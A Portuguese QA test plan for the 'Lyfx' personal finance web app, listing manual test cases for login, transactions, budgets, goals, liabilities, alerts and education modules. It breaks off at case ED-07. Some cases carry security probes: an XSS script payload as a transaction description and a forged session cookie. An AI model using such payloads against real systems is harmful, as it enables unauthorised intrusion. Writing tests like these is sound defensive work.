# Lyfx — Plano de Testes v1.11.0

> Casos de teste executáveis · Atualizado em 07/06/2026
> Baseado em análise do Agent Smith (QA Specialist) · Myers · WAHH · Hendrickson · Kaner
> Cobertura completa: v1.5.0 → v1.11.0 · Inclui CS-17 (Reembolso Especial), CS-18/CS-19 (Notificações), Studio G2, CS-25 (Feriados)

**Como usar este arquivo:**
- Cada caso é autossuficiente: pré-condições + passos + resultado esperado preciso
- Executar na ordem das seções (Autenticação antes de tudo)
- Casos SEC e ISO requerem 2 usuários criados via Studio
- Marcar cada caso: ✅ PASSOU · ❌ FALHOU · ⏭ PULADO

**Ambiente:** `http://localhost:3000` · SQLite/PostgreSQL `dev.db` · Next.js App Router
**Total de casos:** 370+

---

## Índice

1. [Autenticação](#1-autenticação)
2. [Navegação](#2-navegação)
3. [Transações](#3-transações)
4. [Orçamento](#4-orçamento)
5. [Contas Fixas](#5-contas-fixas)
6. [Metas](#6-metas)
7. [Projeções](#7-projeções)
8. [Passivos](#8-passivos)
9. [Alertas Financeiros](#9-alertas-financeiros)
10. [Saúde Financeira](#10-saúde-financeira)
11. [Relatórios](#11-relatórios)
12. [Reembolsos](#12-reembolsos)
13. [Tags](#13-tags)
14. [Instituições](#14-instituições)
15. [Bens e Imóveis](#15-bens-e-imóveis)
16. [Educação](#16-educação)
17. [Perfil](#17-perfil)
18. [Studio G2](#18-studio-g2)
19. [Reembolso Especial (CS-17)](#19-reembolso-especial-cs-17)
20. [Central de Notificações (CS-18/CS-19)](#20-central-de-notificações-cs-18cs-19)
21. [Fluxos Transversais End-to-End](#21-fluxos-transversais-end-to-end)
22. [Segurança](#22-segurança)
23. [Isolamento Multi-Usuário](#23-isolamento-multi-usuário)
24. [Componentes Transversais](#24-componentes-transversais)
25. [Resumo de Cobertura](#25-resumo-de-cobertura)

---

## 1. Autenticação

### A-01 — Criar conta em modo setup
**Prioridade:** ALTO
**Pré-condições:** Banco sem nenhum usuário cadastrado (`dev.db` limpo ou Studio sem usuários)
**Passos:**
1. Acessar `http://localhost:3000/login`
2. Verificar que o formulário exibe 4 campos: Nome, E-mail, Senha, Confirmar senha
3. Preencher Nome: `Usuário Teste`
4. Preencher E-mail: `teste@lyfx.com`
5. Preencher Senha: `123456`
6. Preencher Confirmar senha: `123456`
7. Clicar no botão de criar conta
**Resultado esperado:** Usuário criado com sucesso. Redirecionamento para `/dashboard`. Cookie `lyfx_session` presente no navegador com formato `<userId>.<hmac_hex>`.

---

### A-02 — Fazer login com credenciais válidas
**Prioridade:** CRÍTICO
**Pré-condições:** 1 usuário cadastrado com e-mail `teste@lyfx.com` e senha `123456`
**Passos:**
1. Acessar `/login`
2. Preencher E-mail: `teste@lyfx.com`
3. Preencher Senha: `123456`
4. Clicar em "Entrar"
**Resultado esperado:** Botão muda para verde com ícone de confirmação por ~1s, depois redireciona para `/dashboard`.

---

### A-03 — Tentar login com senha incorreta
**Prioridade:** ALTO
**Pré-condições:** 1 usuário cadastrado com senha `123456`
**Passos:**
1. Acessar `/login`
2. Preencher E-mail: `teste@lyfx.com`
3. Preencher Senha: `senhaerrada`
4. Clicar em "Entrar"
**Resultado esperado:** Mensagem de erro visível na tela. Usuário permanece em `/login`. Nenhum redirecionamento.

---

### A-04 — Tentar login com e-mail inexistente
**Prioridade:** ALTO
**Pré-condições:** 1 usuário cadastrado com e-mail `teste@lyfx.com`
**Passos:**
1. Acessar `/login`
2. Preencher E-mail: `naoexiste@lyfx.com`
3. Preencher Senha: `qualquer123`
4. Clicar em "Entrar"
**Resultado esperado:** A mensagem de erro deve ser **idêntica** à exibida em A-03. Não deve revelar se o e-mail existe ou não (proteção contra username enumeration — WAHH cap. 6).

---

### A-05 — Tentar criar conta com senhas divergentes
**Prioridade:** ALTO
**Pré-condições:** Banco sem usuários (modo setup)
**Passos:**
1. Acessar `/login`
2. Preencher Senha: `123456`
3. Preencher Confirmar senha: `654321`
4. Clicar em criar conta
**Resultado esperado:** Botão executa animação de "shake". Mensagem informando que as senhas não coincidem. Conta não criada.

---

### A-06 — Tentar criar conta com senha menor que 6 caracteres
**Prioridade:** ALTO
**Pré-condições:** Banco sem usuários
**Passos:**
1. Criar conta com senha `12345` (5 caracteres)
**Resultado esperado:** Erro indicando que a senha deve ter no mínimo 6 caracteres. Conta não criada.

---

### A-07 — Tentar criar conta com campo Nome em branco
**Prioridade:** MÉDIO
**Resultado esperado:** Erro indicando que o nome é obrigatório. Conta não criada.

---

### A-08 — Tentar criar conta com campo E-mail em branco
**Prioridade:** MÉDIO
**Resultado esperado:** Erro indicando que o e-mail é obrigatório. Conta não criada.

---

### A-09 — Tentar criar conta com e-mail em formato inválido
**Prioridade:** ALTO
**Passos:** Testar `emailsemarroba`, `email@` e `@dominio.com`
**Resultado esperado:** Erro indicando e-mail inválido em todos os casos. Conta não criada.

---

### A-10 — Tentar criar conta com e-mail já existente
**Prioridade:** ALTO
**Resultado esperado:** Erro indicando que o e-mail já está em uso. Segunda conta não criada.

---

### A-11 — Alternância entre modo login e modo setup
**Prioridade:** BAIXO
**Resultado esperado:** Campos Nome e Confirmar senha somem/aparecem sem reload. Alternância funciona.

---

### A-12 — Modal "Esqueci minha senha"
**Prioridade:** BAIXO
**Resultado esperado:** Modal abre com orientação para acessar perfil ou contatar administrador. Fecha ao clicar fora ou no botão ×.

---

### A-13 — Clicar em "← Início"
**Prioridade:** BAIXO
**Resultado esperado:** Redirecionamento para `/` (landing page).

---

### A-14 — Fazer logout via menu do usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** Cookie `lyfx_session` removido. Redirecionamento para `/`. Tentar acessar `/dashboard` redireciona para `/login`.

---

### A-15 — Tentar acessar rota protegida sem sessão
**Prioridade:** CRÍTICO
**Resultado esperado:** Redirecionamento imediato para `/login`. Página do dashboard não é renderizada.

---

### A-16 — Acessar `/` com sessão ativa
**Prioridade:** MÉDIO
**Resultado esperado:** Redirecionamento automático para `/dashboard`. Landing page não é exibida.

---

### A-17 — Sessão persiste com "Lembrar de mim"
**Prioridade:** ALTO
**Passos:** Marcar "Lembrar de mim", fazer login, fechar o navegador completamente, reabrir e acessar `/dashboard`
**Resultado esperado:** Usuário ainda está logado (cookie com maxAge 30 dias). Dashboard carrega.

---

### A-18 — Sem "Lembrar de mim" — session cookie expira ao fechar browser
**Prioridade:** MÉDIO
**Passos:** Fazer login SEM marcar "Lembrar de mim", fechar o navegador, reabrir e acessar `/dashboard`
**Resultado esperado:** Usuário é redirecionado para `/login` (session cookie expirou).

---

### A-19 — Redirect preserva rota original após login
**Prioridade:** MÉDIO
**Passos:** Sem sessão, acessar `/health`; redirecionar para `/login`; fazer login
**Resultado esperado:** Após login, redireciona para `/health`, não para `/dashboard`.

---

### A-20 — Senha com caracteres especiais
**Prioridade:** MÉDIO
**Passos:** Criar conta com senha `P@$$w0rd!<>&"'`, fazer logout, fazer login com a mesma senha
**Resultado esperado:** Conta criada e login bem-sucedido. Caracteres especiais tratados corretamente.

---

### A-21 — Cookie HMAC com SESSION_SECRET — valor forjado rejeitado
**Prioridade:** CRÍTICO
**Passos:** Criar manualmente cookie `lyfx_session` com valor `cuid123.invalidsig`; acessar `/dashboard`
**Resultado esperado:** Redirecionamento para `/login`. A verificação HMAC rejeita a assinatura inválida.

---

## 2. Navegação

### N-01 — Colapsar e expandir a sidebar
**Prioridade:** BAIXO
**Resultado esperado:** Sidebar alterna entre 220px (expandida) e 60px (colapsada). Conteúdo principal desloca com `--sidebar-width`. Transição 200ms sem salto visual.

---

### N-02 — Tooltip na sidebar colapsada
**Prioridade:** BAIXO
**Resultado esperado:** Tooltip com o nome do módulo aparece ao lado do ícone ao passar o mouse.

---

### N-03 — Highlight da rota ativa
**Prioridade:** BAIXO
**Resultado esperado:** Apenas o item correspondente à rota atual fica destacado em cyan. Item anterior perde o destaque.

---

### N-04 — Abrir menu do usuário
**Prioridade:** BAIXO
**Resultado esperado:** Dropdown aparece com nome completo, link "Editar perfil" e botão "Sair".

---

### N-05 — Fechar menu do usuário clicando fora
**Prioridade:** BAIXO
**Resultado esperado:** Dropdown fecha sem navegar para nenhuma página.

---

### N-06 — Badge de notificações no sino
**Prioridade:** ALTO
**Pré-condições:** Usuário com 3 notificações não lidas
**Resultado esperado:** Badge vermelho com número "3" exibido no ícone de sino no canto superior direito.

---

### N-07 — Módulo beta exibe chip na sidebar
**Prioridade:** MÉDIO
**Pré-condições:** Módulo marcado como beta no Studio → aba Módulos
**Resultado esperado:** Chip amarelo "Beta" visível ao lado do item na sidebar.

---

### N-08 — Módulo não habilitado no plano do usuário
**Prioridade:** ALTO
**Pré-condições:** Usuário com plano que não inclui `km-reimbursement`
**Passos:** Tentar acessar `/km-reimbursement` diretamente
**Resultado esperado:** Redirecionamento para `/dashboard` ou página de erro de acesso. Módulo não renderizado.

---

## 3. Transações

### T-01 — Criar transação avulsa de crédito
**Prioridade:** CRÍTICO
**Resultado esperado:** Transação aparece na lista do mês atual com valor `R$ 6.000,00` em verde. Dashboard atualiza KPI de Receita.

---

### T-02 — Criar transação avulsa de débito
**Prioridade:** CRÍTICO
**Resultado esperado:** Transação aparece na lista com valor `R$ 1.800,00` em vermelho. Dashboard atualiza KPI de Gastos.

---

### T-03 — Criar transação com recorrência mensal
**Prioridade:** ALTO
**Resultado esperado:** Transação criada. Aparece em `/fixed-expenses` na lista de fixos mensais.

---

### T-04 — Criar transação com recorrência mensal e data de encerramento
**Prioridade:** MÉDIO
**Resultado esperado:** Em `/projections`, aparece apenas nos meses até o encerramento, não além.

---

### T-05 — Criar transação com recorrência anual
**Prioridade:** MÉDIO
**Resultado esperado:** Aparece em `/fixed-expenses` com badge do mês. Aparece como pico no gráfico de projeção.

---

### T-06 — Criar transação com tag associada
**Prioridade:** MÉDIO
**Resultado esperado:** Transação listada com o chip da tag visível.

---

### T-07 — Criar transação com múltiplas tags
**Prioridade:** MÉDIO
**Resultado esperado:** Transação exibe todos os chips de tags.

---

### T-08 — Criar transação reembolsável
**Prioridade:** MÉDIO
**Resultado esperado:** Transação aparece em `/transactions` normalmente. Também aparece em `/reimbursements` na lista "Aguardando reembolso".

---

### T-09 — Criar parcelamento (3 parcelas)
**Prioridade:** ALTO
**Resultado esperado:** 3 transações criadas: `(1/3)`, `(2/3)`, `(3/3)` com R$ 1.200,00 cada, em meses consecutivos.

---

### T-10 — Parcelamento com valor não divisível exatamente
**Prioridade:** ALTO
**Passos:** Criar parcelamento: valor `R$ 100,00` em `3` parcelas
**Resultado esperado:** (1/3) = R$ 33,33, (2/3) = R$ 33,33, (3/3) = R$ 33,34. Soma exata = R$ 100,00.

---

### T-11 — Parcelamento com 1 parcela (BVA mínimo)
**Prioridade:** MÉDIO
**Resultado esperado:** 1 transação criada: `Descrição (1/1)`, valor R$ 500,00. Sem comportamento inesperado.

---

### T-12 — Criar transação com valor zero
**Prioridade:** ALTO
**Resultado esperado:** Sistema bloqueia com mensagem "Valor deve ser maior que zero". Transação não criada.

---

### T-13 — Criar transação com valor negativo
**Prioridade:** CRÍTICO
**Resultado esperado:** Campo não aceita valor negativo. Transação não criada com valor negativo.

---

### T-14 — Criar transação com valor extremamente alto
**Prioridade:** MÉDIO
**Passos:** Inserir valor `999999999.99`
**Resultado esperado:** Transação criada. Valor exibido corretamente. Sem overflow visual ou erro de formatação.

---

### T-15 — Criar transação com descrição contendo HTML/XSS
**Prioridade:** CRÍTICO
**Passos:** Criar transação com descrição: `<script>alert('xss')</script>`
**Resultado esperado:** Texto exibido literalmente. Nenhum alerta JavaScript executado em nenhuma visualização.

---

### T-16 — Criar transação com aspas na descrição
**Prioridade:** MÉDIO
**Passos:** Descrição: `Pagamento "João" & 'Maria'`
**Resultado esperado:** Descrição exibida exatamente como digitada. Sem quebra de layout.

---

### T-17 — Navegar entre meses na listagem
**Prioridade:** ALTO
**Resultado esperado:** Cada mês exibe apenas suas próprias transações. Navegação funciona sem reload.

---

### T-18 — Clicar em transação para abrir ActionBar
**Prioridade:** MÉDIO
**Resultado esperado:** ActionBar desliza para baixo com botões "Editar" (âmbar) e "Excluir" (vermelho).

---

### T-19 — Fechar ActionBar com ×
**Prioridade:** BAIXO
**Resultado esperado:** ActionBar fecha sem executar nenhuma ação.

---

### T-20 — Editar transação avulsa (modo single)
**Prioridade:** ALTO
**Resultado esperado:** Transação atualizada com novo valor. Lista e Dashboard refletem imediatamente.

---

### T-21 — Editar parcela de parcelamento (modo installment)
**Prioridade:** ALTO
**Resultado esperado:** A parcela clicada e todas as futuras do grupo são atualizadas. Parcelas passadas inalteradas. Campo de data não disponível.

---

### T-22 — Excluir transação individual
**Prioridade:** ALTO
**Resultado esperado:** Transação removida da lista. Não aparece no DRE ou KPIs.

---

### T-23 — Excluir grupo de parcelas
**Prioridade:** ALTO
**Resultado esperado:** Todas as parcelas removidas da listagem e das projeções.

---

### T-24 — Transação recorrente aparece nos meses futuros
**Prioridade:** ALTO
**Resultado esperado:** A transação aparece em todos os 12 meses projetados.

---

### T-25 — Data no futuro distante
**Prioridade:** BAIXO
**Passos:** Criar transação com data `01/01/2050`
**Resultado esperado:** Transação criada sem erro. Aparece no mês/ano correto ao navegar para janeiro/2050.

---

## 4. Orçamento

### O-01 — Definir receita esperada
**Prioridade:** ALTO
**Resultado esperado:** Valor salvo como `R$ 6.000,00`. Percentuais de alocação passam a usar esse valor como referência.

---

### O-02 — Definir receita esperada como zero
**Prioridade:** CRÍTICO
**Resultado esperado:** Sem divisão por zero. Exibe `--` ou `0%` no lugar do percentual, sem `NaN` ou crash.

---

### O-03 — Definir alocação para uma categoria
**Prioridade:** ALTO
**Resultado esperado:** Alocação salva. Percentual exibido como `13,3%` (800/6000). Barra de progresso aparece.

---

### O-04 — Verificar barra de progresso verde (< 75%)
**Prioridade:** MÉDIO
**Resultado esperado:** Barra verde em 50% (400/800). Badge `R$ 400 / R$ 800`.

---

### O-05 — Verificar barra de progresso âmbar (75–99%)
**Prioridade:** MÉDIO
**Resultado esperado:** Barra âmbar em ~81%. Indicação visual de atenção.

---

### O-06 — Verificar barra de progresso vermelha (≥ 100%)
**Prioridade:** ALTO
**Resultado esperado:** Barra vermelha em 100% (trava no limite visual). Badge indica estouro.

---

### O-07 — Alocação maior que receita esperada
**Prioridade:** ALTO
**Resultado esperado:** Percentual exibe `166,7%`. Balanço planejado mostra valor negativo. Sem crash.

---

### O-08 — Categoria com gastos mas sem alocação
**Prioridade:** MÉDIO
**Resultado esperado:** Categoria exibe o gasto real sem barra de progresso ou com indicação "sem limite". Sem crash.

---

### O-09 — Navegar para mês anterior e verificar gasto real
**Prioridade:** MÉDIO
**Resultado esperado:** Gastos reais mudam para refletir o mês selecionado. Alocações permanecem iguais.

---

### O-10 — Mês sem nenhuma transação
**Prioridade:** MÉDIO
**Resultado esperado:** Todas as barras em 0%. Nenhum `NaN`. Balanço real = R$ 0,00.

---

### O-11 — Verificar balanço planejado vs real
**Prioridade:** MÉDIO
**Resultado esperado:** Planejado = R$ 2.000 (6.000 − 4.000). Real = R$ 2.500 (6.000 − 3.500).

---

## 5. Contas Fixas

### F-01 — Verificar cards de resumo
**Prioridade:** MÉDIO
**Resultado esperado:** Total mensal = soma das mensais, total anual = soma das anuais, projeção 12 meses = (mensal × 12) + anuais.

---

### F-02 — Verificar lista de fixos mensais
**Prioridade:** MÉDIO
**Resultado esperado:** Todas as transações com recorrência mensal aparecem, ordenadas por valor decrescente.

---

### F-03 — Verificar fixos anuais com badge de mês
**Prioridade:** MÉDIO
**Resultado esperado:** Cada item exibe um badge com o mês em que ocorre.

---

### F-04 — Verificar gráfico de projeção 12 meses
**Prioridade:** MÉDIO
**Resultado esperado:** Barras vermelhas para a base mensal. Picos amarelos nos meses com despesas anuais adicionais.

---

### F-05 — Provisão sazonal com urgência vermelha
**Prioridade:** MÉDIO
**Pré-condições:** Despesa anual com vencimento em ≤ 2 meses
**Resultado esperado:** Item exibido com badge vermelho "Urgente". Valor = total ÷ meses restantes.

---

### F-06 — Cálculo de provisão sazonal
**Prioridade:** MÉDIO
**Pré-condições:** Despesa anual de R$ 1.200 com vencimento em 6 meses
**Resultado esperado:** `R$ 200,00/mês` (1.200 ÷ 6). Não usa divisor fixo de 12.

---

## 6. Metas

### M-01 — Criar meta com cálculo em tempo real
**Prioridade:** ALTO
**Resultado esperado:** Sistema exibe `R$ 1.000,00/mês` enquanto o usuário preenche valor R$12.000 e prazo 12 meses.

---

### M-02 — Meta com prazo no passado
**Prioridade:** ALTO
**Resultado esperado:** Sistema bloqueia com mensagem. Meta não criada.

---

### M-03 — Meta com prazo no mês atual
**Prioridade:** MÉDIO
**Resultado esperado:** 1 cobrança gerada para o mês atual.

---

### M-04 — Classificação "Cabe folgado" (≤ 30% da sobra)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge verde "Cabe folgado".

---

### M-05 — Classificação "Factível" (31–60% da sobra)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge "Factível".

---

### M-06 — Classificação "Apertado" (61–100% da sobra)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge âmbar "Apertado — considere estender o prazo".

---

### M-07 — Classificação "Inviável" (> sobra)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge vermelho "Inviável — você precisaria de R$ X/mês a mais".

---

### M-08 — Usuário sem histórico de 3 meses (denominador zero)
**Prioridade:** ALTO
**Resultado esperado:** Sem divisão por zero. Exibe "Sem histórico suficiente" ou comportamento seguro.

---

### M-09 — Marcar cobrança como paga
**Prioridade:** ALTO
**Resultado esperado:** Status muda para paga. `currentAmount` aumenta. Barra de progresso atualiza.

---

### M-10 — Desmarcar cobrança paga
**Prioridade:** MÉDIO
**Resultado esperado:** Cobrança volta para pendente. `currentAmount` reduz. Barra diminui.

---

### M-11 — Conclusão automática quando acumulado ≥ alvo
**Prioridade:** ALTO
**Resultado esperado:** Meta muda para status "Concluída" ao marcar última cobrança.

---

### M-12 — Cobrança em atraso
**Prioridade:** MÉDIO
**Resultado esperado:** Badge vermelho "Em atraso". Alerta correspondente em `/alerts`.

---

### M-13 — Excluir meta
**Prioridade:** MÉDIO
**Resultado esperado:** Meta e todos os `GoalPayment` associados removidos. Widget no dashboard atualiza.

---

### M-14 — Banner de alerta de passivos ≥ 5% a.m.
**Prioridade:** MÉDIO
**Resultado esperado:** Banner vermelho listando passivos de alto custo em `/goals`.

---

### M-15 — Widget de metas no dashboard
**Prioridade:** MÉDIO
**Resultado esperado:** Widget exibe barra de progresso com `currentAmount / targetAmount` e percentual correto.

---

## 7. Projeções

### P-01 — Verificar cards de resumo
**Prioridade:** MÉDIO
**Resultado esperado:** "Livre acumulado", "Média mensal livre" e "Meses no vermelho" calculados corretamente.

---

### P-02 — Clicar em mês do gráfico e ver detalhe
**Prioridade:** MÉDIO
**Resultado esperado:** Painel de detalhe com breakdown de entradas e saídas. Badge "Anual" em lançamentos anuais.

---

### P-03 — Recorrência encerrada não aparece após o fim
**Prioridade:** ALTO
**Resultado esperado:** Transação aparece apenas até o mês de encerramento. No mês seguinte, não aparece.

---

### P-04 — Distribuição correta de parcelas
**Prioridade:** ALTO
**Resultado esperado:** Cada parcela aparece apenas no seu respectivo mês. Sem duplicatas ou ausências.

---

## 8. Passivos

### L-01 — Criar passivo completo
**Prioridade:** ALTO
**Resultado esperado:** Passivo criado. Cards de resumo atualizados. Previsão de quitação calculada.

---

### L-02 — Alerta crítico: mínimo não cobre juros
**Prioridade:** CRÍTICO
**Pré-condições:** Saldo `R$ 10.000`, taxa `15% a.m.`, mínimo `R$ 500`
**Resultado esperado:** Alerta vermelho: "Mínimo não cobre os juros — essa dívida nunca será quitada assim".

---

### L-03 — Verificar previsão de quitação (cores)
**Prioridade:** MÉDIO
**Resultado esperado:** ≤12 meses = verde; 13–36 = âmbar; >36 = vermelho.

---

### L-04 — Marcar passivo como quitado
**Prioridade:** MÉDIO
**Resultado esperado:** Passivo movido para seção "Quitadas". Não aparece nos cards de resumo como dívida ativa.

---

### L-05 — Reativar passivo quitado
**Prioridade:** MÉDIO
**Resultado esperado:** Passivo retorna para lista de ativos. Cards de resumo atualizam.

---

### L-06 — Modo Recuperação: ordenação por maior taxa
**Prioridade:** ALTO
**Resultado esperado:** Ordem decrescente por taxa: 8% (1ª), 5% (2ª), 3% (3ª). Badges de prioridade visíveis.

---

### L-07 — Calculadora de pagamento extra
**Prioridade:** MÉDIO
**Resultado esperado:** Passivo prioritário mostra redução de meses. Demais mantêm apenas o mínimo.

---

### L-08 — Calculadora com extra maior que saldo devedor
**Prioridade:** MÉDIO
**Resultado esperado:** Sistema exibe "quitado no próximo mês". Sem valor negativo de meses ou crash.

---

### L-09 — Passivo com taxa zero
**Prioridade:** MÉDIO
**Resultado esperado:** Sem alerta "mínimo não cobre juros". Previsão de quitação = meses calculados corretamente.

---

### L-10 — Passivo com taxa extrema (100% a.m.)
**Prioridade:** MÉDIO
**Resultado esperado:** Alerta de mínimo ativo. Sem crash no cálculo.

---

## 9. Alertas Financeiros

### AL-01 — Estado vazio "Tudo em ordem"
**Prioridade:** MÉDIO
**Resultado esperado:** Ícone de sino verde e mensagem positiva. Nenhum card de alerta.

---

### AL-02 — Alerta de orçamento aviso (80%)
**Prioridade:** ALTO
**Resultado esperado:** Card âmbar "Orçamento — Aviso" com categoria e percentual. Link para `/budget`.

---

### AL-03 — Alerta de orçamento crítico (100%)
**Prioridade:** ALTO
**Resultado esperado:** Card vermelho "Orçamento — Crítico" com valor de estouro indicado.

---

### AL-04 — Alerta de passivo crítico (cheque especial)
**Prioridade:** CRÍTICO
**Resultado esperado:** Card vermelho "Passivo Crítico" com taxa ao mês E equivalente anual por juros compostos: `(1,12)^12 − 1 = 286% a.a.`

---

### AL-05 — Passivo crítico quitado não gera alerta
**Prioridade:** ALTO
**Resultado esperado:** Nenhum alerta de passivo crítico quando saldo = 0 ou passivo quitado.

---

### AL-06 — Alerta desaparece quando condição resolvida
**Prioridade:** ALTO
**Resultado esperado:** Ao excluir a transação que causou estouro, alerta desaparece. Sem ação manual do usuário.

---

### AL-07 — Alerta sazonal (vencimento em ≤ 2 meses)
**Prioridade:** MÉDIO
**Resultado esperado:** Card âmbar "Sazonal — Aviso" com nome da despesa, valor e meses restantes.

---

### AL-08 — Alerta sazonal com vencimento hoje (BVA = 0 meses)
**Prioridade:** MÉDIO
**Resultado esperado:** Alerta sazonal gerado (0 ≤ threshold de 2 meses). Badge "Urgente" ou equivalente.

---

### AL-09 — Múltiplos alertas do mesmo tipo
**Prioridade:** MÉDIO
**Resultado esperado:** 3 cards separados, um por categoria estourada. Chip de contagem indica "3".

---

### AL-10 — Todos os tipos de alerta ativos simultaneamente
**Prioridade:** ALTO
**Resultado esperado:** Todos os alertas exibidos. Críticos antes dos avisos. Chips com contagens corretas. Sem crash.

---

### AL-11 — Agrupamento por severidade
**Prioridade:** MÉDIO
**Resultado esperado:** Todos os alertas críticos (vermelho) aparecem antes dos alertas de aviso (âmbar).

---

### AL-12 — Alertas financeiros não têm botão de excluir
**Prioridade:** ALTO
**Resultado esperado:** Cards de alerta financeiro não exibem botão de dismiss/excluir. Apenas as notificações do sistema têm esse botão.

---

## 10. Saúde Financeira

### S-01 — Score com zero transações (usuário novo)
**Prioridade:** ALTO
**Resultado esperado:** Score exibido sem crash. Cada dimension card explica que não há dados suficientes. Sem `NaN` ou `Infinity`.

---

### S-02 — Gauge SVG animado
**Prioridade:** BAIXO
**Resultado esperado:** Ponteiro anima do 0 até o score calculado. Animação suave, sem travamento.

---

### S-03 — Perfil "Em Recuperação" (0–39)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge vermelho "Em Recuperação".

---

### S-04 — Perfil "Estabilizado" (40–59)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge âmbar "Estabilizado".

---

### S-05 — Perfil "Em Construção" (60–79)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge cyan "Em Construção".

---

### S-06 — Perfil "Livre" (80–100)
**Prioridade:** MÉDIO
**Resultado esperado:** Badge verde "Livre".

---

### S-07 — Dimensão Comprometimento acima de 30%
**Prioridade:** ALTO
**Resultado esperado:** Pontuação abaixo do máximo de 30 pts. Descrição indica comprometimento excessivo.

---

### S-08 — Mês sem receita mas com despesas (poupança 0/0)
**Prioridade:** ALTO
**Resultado esperado:** Dimensão Poupança = 0 pontos. Sem divisão por zero ou `NaN`.

---

### S-09 — Declarar reserveBalance inline
**Prioridade:** ALTO
**Resultado esperado:** Valor salvo. Dimensão Reserva recalculada. Score total atualiza.

---

### S-10 — reserveBalance altera pontuação da dimensão Reserva
**Prioridade:** ALTO
**Resultado esperado:** Com 2 meses de reserva: pontuação baixa. Com 6 meses: pontuação máxima de 20 pts.

---

### S-11 — Sem reserveBalance usa proxy debit_longterm
**Prioridade:** MÉDIO
**Resultado esperado:** Sistema usa histórico de `debit_longterm` como proxy. Cálculo funciona sem erro.

---

### S-12 — Tip prioritizado pela dimensão mais fraca
**Prioridade:** MÉDIO
**Resultado esperado:** A dica aborda a dimensão de menor pontuação. Não exibe dica aleatória.

---

## 11. Relatórios

### R-01 — Selecionar período e verificar DRE
**Prioridade:** ALTO
**Resultado esperado:** DRE exibe todas as categorias com transações. Valores absolutos e percentuais sobre receita.

---

### R-02 — Mês sem transações
**Prioridade:** ALTO
**Resultado esperado:** Categorias com R$ 0,00. Percentuais exibem `0%` ou `--`. Sem `NaN`. Resultado líquido = R$ 0,00.

---

### R-03 — Apenas receitas (sem despesas)
**Prioridade:** MÉDIO
**Resultado esperado:** Categorias de despesa exibem R$ 0,00. Resultado líquido = Receita total. Sem crash.

---

### R-04 — Resultado líquido negativo
**Prioridade:** MÉDIO
**Resultado esperado:** Resultado líquido exibido em vermelho com valor negativo. Ex: `-R$ 500,00`.

---

### R-05 — Receita zero com despesas (percentuais indefinidos)
**Prioridade:** ALTO
**Resultado esperado:** Percentuais exibem `--` ou `∞` de forma controlada. Sem `NaN` ou `Infinity`. Sem crash.

---

### R-06 — Verificar percentuais corretos
**Prioridade:** MÉDIO
**Pré-condições:** Receita = R$ 5.000, Despesa fixa = R$ 1.500
**Resultado esperado:** Percentual da categoria "Despesa fixa" = `30,0%`.

---

## 12. Reembolsos

### RE-01 — Marcar despesa como reembolsada
**Prioridade:** MÉDIO
**Resultado esperado:** Despesa movida para "Reembolsadas" com badge verde e data do recebimento registrada.

---

### RE-02 — Desfazer marcação de reembolso
**Prioridade:** MÉDIO
**Resultado esperado:** Despesa volta para "Aguardando reembolso". Data de recebimento removida.

---

### RE-03 — Despesa não reembolsável não aparece
**Prioridade:** MÉDIO
**Resultado esperado:** Transação sem o toggle não aparece em nenhuma das listas de reembolsos.

---

### RE-04 — Verificar cards de resumo
**Prioridade:** MÉDIO
**Resultado esperado:** "A receber" = soma de pendentes. "Já reembolsado" = soma de recebidas. "Total" = soma dos dois.

---

## 13. Tags

### TG-01 — Criar tag com preview em tempo real
**Prioridade:** MÉDIO
**Resultado esperado:** Chip de preview atualiza em tempo real com cor e ícone selecionados.

---

### TG-02 — Tentar criar tag com nome duplicado
**Prioridade:** ALTO
**Resultado esperado:** Erro indicando que o nome já existe para este usuário. Tag não criada.

---

### TG-03 — Editar tag existente
**Prioridade:** MÉDIO
**Resultado esperado:** Alterações refletidas na listagem e nos chips de transações que usam essa tag.

---

### TG-04 — Excluir tag com vínculos
**Prioridade:** ALTO
**Resultado esperado:** Tag removida. As transações vinculadas permanecem intactas mas sem o chip daquela tag.

---

## 14. Instituições

### I-01 — Criar instituição e adicionar conta
**Prioridade:** MÉDIO
**Resultado esperado:** Instituição criada com conta vinculada. Card expandido exibe a conta com saldo.

---

### I-02 — Excluir instituição (cascade)
**Prioridade:** ALTO
**Resultado esperado:** Instituição e suas contas removidas. Passivo vinculado permanece mas sem FK da instituição (null). Transações vinculadas preservadas sem FK de conta (null).

---

### I-03 — Verificar passivos vinculados no card
**Prioridade:** MÉDIO
**Resultado esperado:** Seção de passivos exibe o passivo vinculado com nome e saldo.

---

## 15. Bens e Imóveis

### B-01 — Criar imóvel com endereço
**Prioridade:** MÉDIO
**Resultado esperado:** Bem criado. Card expandido exibe variação de valor em verde (R$ +70.000).

---

### B-02 — Adicionar despesa e marcar como paga
**Prioridade:** MÉDIO
**Resultado esperado:** Data de pagamento registrada. Toggle muda para estado pago. Total "pago" do bem atualiza.

---

### B-03 — Verificar alerta de despesa vencida
**Prioridade:** MÉDIO
**Resultado esperado:** Despesa vencida com fundo vermelho de alerta. Widget no dashboard exibe badge de pendentes.

---

### B-04 — Excluir bem (cascade)
**Prioridade:** MÉDIO
**Resultado esperado:** Bem e todas as despesas associadas removidos. Widget do dashboard atualiza.

---

## 16. Educação

### ED-01 — Acessar hub de educação
**Prioridade:** ALTO
**Resultado esperado:** Hub carrega com as 5 trilhas. A trilha correspondente ao perfil atual está destacada como "Recomendada".

---

### ED-02 — Verificar trilha recomendada baseada no score
**Prioridade:** ALTO
**Pré-condições:** Score entre 60–79 (perfil "stable")
**Resultado esperado:** Trilha "stable" destacada. As outras 4 sem destaque.

---

### ED-03 — Verificar barra de progresso por trilha
**Prioridade:** MÉDIO
**Resultado esperado:** Barra exibe percentual correto (ex: 10% para 2/20 concluídas).

---

### ED-04 — Abrir pílula e verificar seções tipadas
**Prioridade:** ALTO
**Resultado esperado:** Seções com estilos visuais distintos: `concept` (neutro), `why` (âmbar), `how` (verde).

---

### ED-05 — Responder quiz — opção correta
**Prioridade:** ALTO
**Resultado esperado:** Header do modal verde com "Resposta correta!". Opção selecionada destaca em verde com ✓.

---

### ED-06 — Responder quiz — opção incorreta
**Prioridade:** ALTO
**Resultado esperado:** Header vermelho "Resposta incorreta". Opção clicada em vermelho com ✗. Opção correta em verde.

---

### ED-07 — Bloqueio de opções na etapa de correção
